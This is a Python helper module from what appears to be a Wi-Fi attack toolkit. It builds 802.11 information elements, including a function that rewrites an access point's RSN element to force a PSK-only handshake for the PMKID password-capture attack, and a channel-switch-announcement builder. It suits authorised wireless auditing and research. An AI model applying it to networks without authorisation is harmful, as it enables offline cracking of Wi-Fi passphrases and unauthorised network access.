"""802.11 information-element builders + the shared RSN helper (pure spec).

Consolidates the SSID / rates / RSN / DS-param IE assembly that the auth, assoc, and
probe frame builders each used to hand-roll, plus the client-side RSN rewrite the PMKID
attack uses.
"""
from typing import Optional

# Supported / Extended supported rate menus (APs only spot-check that they parse).
SUPPORTED_RATES = bytes([0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24])
EXT_SUPPORTED_RATES = bytes([0x30, 0x48, 0x60, 0x6C])

# Generic WPA2-PSK-CCMP RSN IE (tag 48): version 1, CCMP group + pairwise, single
# AKM = PSK, no PMF. The client-side fallback when the AP's own IE is unusable.
GENERIC_RSN_IE = bytes.fromhex("30140100000fac040100000fac040100000fac020000")

_AKM_PSK = 0x02
_RSN_CAP_MFPC = 0x0080          # RSN caps MFPC bit (bit 7)
_BIP_CMAC_128 = b"\x00\x0f\xac\x06"


def ssid_ie(ssid: str) -> bytes:
    """SSID IE (tag 0): UTF-8, truncated to the 32-byte spec maximum."""
    s = ssid.encode("utf-8", "ignore")[:32]
    return bytes([0x00, len(s)]) + s


def rates_ie() -> bytes:
    """Supported Rates IE (tag 1)."""
    return bytes([0x01, len(SUPPORTED_RATES)]) + SUPPORTED_RATES


def ext_rates_ie() -> bytes:
    """Extended Supported Rates IE (tag 50)."""
    return bytes([0x32, len(EXT_SUPPORTED_RATES)]) + EXT_SUPPORTED_RATES


def ds_param_ie(channel: int) -> bytes:
    """DS Parameter Set IE (tag 3): the operating channel."""
    return bytes([0x03, 0x01, channel & 0xFF])


def csa_ie(new_channel: int, *, mode: int = 1, count: int = 0) -> bytes:
    """Channel Switch Announcement IE (tag 37): mode (1 = halt TX until the switch), target channel, count."""
    return bytes([0x25, 0x03, mode & 0xFF, new_channel & 0xFF, count & 0xFF])


def secondary_channel_offset_ie(offset: int = 0) -> bytes:
    """Secondary Channel Offset IE (tag 62): 0 = SCN (20 MHz), 1 = above, 3 = below."""
    return bytes([0x3E, 0x01, offset & 0xFF])


def force_psk_akm(rsn_ie: bytes, akm: int = _AKM_PSK, *, pmf_capable: bool = False) -> Optional[bytes]:
    """Rewrite an RSN IE to a single ``00-0F-AC:akm`` AKM (PSK by default) over the
    AP's ciphers, authoring a client RSN tail that mirrors the AP's PMF posture:
    ``pmf_capable`` → MFPC=1 (MFPR=0) + BIP group-mgmt (a transition AP often only
    associates PMF-capable STAs); else clean 0x0000 caps. Drops the AP's PMKID list
    either way; returns None if the IE is malformed (caller falls back to generic).

    Selecting one PSK AKM (not echoing the AP's full list, which claims SAE and gets
    us ignored) runs the PSK 4-way → PMKID in M1. RSNE body layout: version(2)
    group(4) pw_count(2) pw(4*n) akm_count(2) akm(4*m) [caps(2)] [pmkid_count(2)
    pmkid...] [group-mgmt(4)]."""
    if len(rsn_ie) < 2 or rsn_ie[0] != 0x30:
        return None
    body = rsn_ie[2:2 + rsn_ie[1]]
    if len(body) < 8:
        return None
    pw_count = int.from_bytes(body[6:8], "little")
    akm_off = 8 + 4 * pw_count
    if akm_off + 2 > len(body):
        return None
    akm_count = int.from_bytes(body[akm_off:akm_off + 2], "little")
    akm_end = akm_off + 2 + 4 * akm_count
    if akm_end > len(body):
        return None
    new_akm = b"\x01\x00\x00\x0f\xac" + bytes([akm])      # count=1 + 00-0F-AC:akm
    if pmf_capable:                                       # MFPC=1, PMKID-count 0, BIP
        tail = _RSN_CAP_MFPC.to_bytes(2, "little") + b"\x00\x00" + _BIP_CMAC_128
    else:
        tail = b"\x00\x00"                               # clean caps, no MFP
    new_body = body[:akm_off] + new_akm + tail
    return bytes([0x30, len(new_body)]) + new_body
